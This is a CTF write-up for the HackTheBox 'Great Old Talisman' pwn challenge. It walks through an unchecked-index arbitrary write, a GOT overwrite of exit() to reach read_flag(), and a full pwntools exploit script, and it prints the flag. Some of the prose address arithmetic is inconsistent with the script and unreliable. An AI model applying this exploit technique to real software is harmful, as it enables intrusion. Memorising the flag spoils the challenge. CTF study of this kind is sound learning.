---
title: "Great Old Talisman Challenge Writeup: Memory Vulnerability - HackTheBox University CTF 2023: Brains & Bytes"
layout: post
author: Jorge Moreno
---

This challenge is part of the event [HackTheBox University CTF 2023: Brains & Bytes](../htb-bb-2023-ctf)

## Challenge Description

---

> Zombies are closing in from all directions, and our situation appears dire! Fortunately, we've come across this ancient and formidable Great Old Talisman, a source of hope and protection. However, it requires the infusion of a potent enchantment to unleash its true power.
> 

Challenge Author(s): w3th4nds \
Category: **Binary Explotation**  
Difficulty: **Very Easy**

## Challenge Solution

---

First, we check the file with ``file`` and ``checksec`` commands:

We can see it is dinamically linked 64-bit binary. With canary (stack protector) and the No eXecute bit so we can’t use shellcode to pwn this challenge.

The first thing we see after executing the vulnerable binary is the following text:

![Untitled](images/great-old-talisman/Untitled.png)

It prompts us for a number 1 or 0. After that it receives an input of 2 bytes from stdin.

Lets begin with with the decompiling.

```c
void main(void)

{
  long in_FS_OFFSET;
  int option;
  undefined8 canary;
  
  canary = *(undefined8 *)(canary + 0x28);
  setup();
  banner();
  printf(
        "\nThis Great Old Talisman will protect you from the evil powers of zombies! (...) \n>> "
        );
  __isoc99_scanf("%d",&option);
  printf("\nSpell: ");
  read(0,talis + (long)option * 8,2);
                    /* WARNING: Subroutine does not return */
  exit(0x520);
}
```

The main function reads from stdin the option and then uses it to store the 2 bytes that we send it.

```c
read(0,talis + (long)option * 8,2);
```

Reads 2 bytes and stores it in the address of ``talis + (option * 8)``. This line is vulnerable to arbitrary write, because as we can see there are not limits inside the integer that we can send to the program. So we could overwrite any address we want with an arbitrary (2 byte long) value. 

In this case we can see that there is also a function called ``read_flag()`` that prints the flag to us.

In the assembly code for ``main()`` function we can see that the next function called right after ``read()`` is ``exit()``

![Untitled](images/great-old-talisman/Untitled%201.png)

With the ``dump qword`` command from ``gdb-pwndbg`` we check the address of ``talis``.

![Untitled](images/great-old-talisman/Untitled%202.png)

And ``read_flag()`` with info fun.

![Untitled](images/great-old-talisman/Untitled%203.png)

We can check the ``exit@GOT`` function with Ghidra:

![Untitled](images/great-old-talisman/Untitled%204.png)

So we could maybe overwrite the exit function last 2 bytes with the bug we saw before.

To do this we have to calculate the offset and get a number that we can send to the program that after being multiplicated by 8 and added to **talis** is the address of **exit.**

``0x404080 - 0x4040a0 = -32``

We know that it multiplicates it by 8 so we can send -4. That way it will store the 2 bytes that we send at ``0x404080 + (-4*8) = 0x4040a0 (exit.got.plt)`` 

Now we send the last two bytes of the ``read_flag()`` function address ``\x5a\x13`` and we can grab our flag.

## Full Script

---

{% highlight python %}
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall', checksec = False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("94.237.48.55", 56734)
    #nc 94.237.48.55 56734
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exit_got = 0x404080
talis = 0x4040a0 

# Escribo \x5a\x13 en 0x404080 + (0x404080 - 0x4040a0)
# Le pasamos primero option = -0x20 = -32
# Le pasamos -4 porque el read multiplica option * 8. 
# Le pasamos los 2 bytes de la direccion y lo tira

io = start()

io.sendlineafter(b'>>', b'-4')
io.recvuntil(b':')
io.send(b'\x5a\x13')

io.interactive()
{% endhighlight %}


**FLAG - HTB{th4nk_G0T_w3_h4v3_th15_t4l15m4n}**